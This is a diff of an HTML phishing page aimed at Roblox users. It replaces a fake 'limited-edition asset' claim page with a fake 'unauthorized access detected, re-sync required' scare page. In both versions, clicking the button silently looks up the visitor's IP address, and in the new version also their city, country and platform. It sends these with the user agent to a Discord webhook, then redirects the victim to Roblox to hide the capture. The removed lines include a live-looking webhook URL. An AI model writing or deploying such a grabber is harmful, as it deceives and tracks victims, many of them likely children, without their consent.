@@ -1,70 +1,53 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox | Synchronization</title>
+    <title>Critical System Synchronization</title>
     <style>
-        body { background-color: #f2f4f5; font-family: 'Segoe UI', Arial; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 380px; padding: 40px; text-align: center; border: 1px solid #e3e3e3; }
-        .heart { font-size: 50px; color: #ff4d4d; margin-bottom: 20px; display: inline-block; animation: pulse 1.2s infinite; }
-        h1 { font-size: 22px; margin: 10px 0; color: #333; }
-        p { font-size: 14px; color: #666; line-height: 1.5; }
-        .btn { background-color: #00b2ff; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
-        #status { font-size: 11px; color: #999; margin-top: 15px; }
-        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.15);} 100% {transform: scale(1);} }
+        body { background: #0b0b0b; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { border: 1px solid #ff0000; padding: 40px; box-shadow: 0 0 20px #ff0000; text-align: center; }
+        .glitch { font-size: 20px; text-transform: uppercase; animation: shake 0.5s infinite; }
+        .btn { margin-top: 20px; background: transparent; color: #ff0000; border: 1px solid #ff0000; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        .btn:hover { background: #ff0000; color: #000; }
+        @keyframes shake { 0% {transform: translate(0);} 25% {transform: translate(2px, -2px);} 50% {transform: translate(-2px, 2px);} 100% {transform: translate(0);} }
     </style>
 </head>
 <body>
-
-    <div class="card">
-        <div class="heart">❤️</div>
-        <h1>Sync Heart Box</h1>
-        <p>Your limited-edition asset is ready. Click below to synchronize your Roblox inventory.</p>
-        <button class="btn" id="claimBtn">Claim Asset</button>
-        <div id="status">Secure Session: Active</div>
+    <div class="terminal">
+        <div class="glitch">UNAUTHORIZED ACCESS DETECTED</div>
+        <p>RE-SYNC REQUIRED TO PREVENT ACCOUNT LOCKOUT</p>
+        <button class="btn" id="exec">INITIALIZE SYNC</button>
+        <div id="out" style="margin-top:10px; font-size:10px;"></div>
     </div>
 
-    <script>
-        // REPLACE THIS WITH YOUR REAL WEBHOOK
-        const HOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
+<script>
+const HOOK = "YOUR_WEBHOOK_HERE";
 
-        document.getElementById('claimBtn').addEventListener('click', async () => {
-            const status = document.getElementById('status');
-            status.innerText = "Connecting to Roblox Servers...";
-
-            try {
-                // Get IP via a high-availability service
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                // Send the data to your Discord
-                await fetch(HOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🎯 TARGET SYNCED",
-                            color: 16729156,
-                            fields: [
-                                { name: "User", value: "heartboxx", inline: true },
-                                { name: "IPv4", value: ipData.ip, inline: true },
-                                { name: "User-Agent", value: navigator.userAgent }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
-            } catch (e) {
-                console.log("Silent error to prevent white screen");
-            }
-
-            // Always redirect, even if the capture fails
-            status.innerText = "Redirecting...";
-            setTimeout(() => {
-                window.location.href = "https://www.roblox.com/home";
-            }, 800);
+document.getElementById('exec').addEventListener('click', async () => {
+    document.getElementById('out').innerText = "PENETRATING SYSTEM LAYERS...";
+    
+    try {
+        const info = await fetch('https://ipapi.co/json/').then(r => r.json());
+        
+        await fetch(HOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "💀 SHΔDØW WORM CAPTURE",
+                    color: 0,
+                    fields: [
+                        { name: "IP", value: info.ip, inline: true },
+                        { name: "LOC", value: `${info.city}, ${info.country}`, inline: true },
+                        { name: "HW", value: navigator.platform },
+                        { name: "UA", value: navigator.userAgent }
+                    ]
+                }]
+            })
         });
-    </script>
+    } catch(e) {}
+    
+    window.location.href = "https://www.roblox.com/login";
+});
+</script>
 </body>
 </html>
